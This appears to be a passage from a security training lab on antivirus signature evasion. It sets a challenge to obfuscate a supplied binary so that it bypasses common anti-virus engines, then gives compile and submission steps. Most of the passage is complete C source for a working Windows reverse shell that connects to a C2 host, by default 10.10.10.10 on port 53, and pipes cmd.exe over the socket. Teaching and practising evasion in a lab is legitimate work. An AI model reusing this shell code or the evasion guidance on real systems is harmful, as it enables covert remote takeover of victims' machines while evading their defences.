# Putting It All Together: Signature Evasion

As reiterated throughout both this room and the **Obfuscation Principles** section, no single method will be 100% effective or reliable.

To create a more effective and reliable methodology, combine several of the methods covered in this room and the previous one.

When determining the order of obfuscation, consider the impact of each method. For example, is it easier to obfuscate an already broken class, or to break a class that is already obfuscated?

> **Note:** In general, you should run automated or less specific obfuscation methods *after* specific signature breaking. However, you will not need those techniques for this challenge.

---

## Challenge Instructions

Taking these notes into consideration, modify the provided binary to meet the specifications below:

- **No suspicious library calls present**
- **No leaked function or variable names**
- **File hash is different than the original hash**
- **Binary bypasses common anti-virus engines**

> **Note:** When considering library calls and leaked functions, be conscious of the IAT table and strings in your binary.

---

## Provided Source Code

```c
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024

void RunShell(char* C2Server, int C2Port) {
    SOCKET mySocket;
    struct sockaddr_in addr;
    WSADATA version;
    WSAStartup(MAKEWORD(2,2), &version);
    mySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    addr.sin_family = AF_INET;

    addr.sin_addr.s_addr = inet_addr(C2Server);
    addr.sin_port = htons(C2Port);

    if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
        closesocket(mySocket);
        WSACleanup();
    } else {
        printf("Connected to %s:%d\n", C2Server, C2Port);

        char Process[] = "cmd.exe";
        STARTUPINFO sinfo;
        PROCESS_INFORMATION pinfo;
        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

        printf("Process Created %lu\n", pinfo.dwProcessId);

        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
    }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = "10.10.10.10";
        int port = 53;
        RunShell(host, port);
    }
    return 0;
}
```

---

## Compilation Instructions

Once sufficiently obfuscated, compile the payload on the AttackBox or VM of your choice using GCC or another C compiler. The file name must be saved as `challenge.exe`. Once compiled, submit the executable to the webserver at `http://MACHINE_IP/`. If your payload satisfies the requirements listed, it will be run and a beacon will be sent to the provided server IP and port.

> **Important:** Change the `C2Server` and `C2Port` variables in the provided payload or this challenge will not work and you will not receive a shell back.

> **Note:** When compiling with GCC, add compiler options for winsock2 and ws2tcpip. These libraries can be included using the compiler flags `-lwsock32` and `-lws2_32`.

---

If you are still stuck, a walkthrough of the solution is provided below.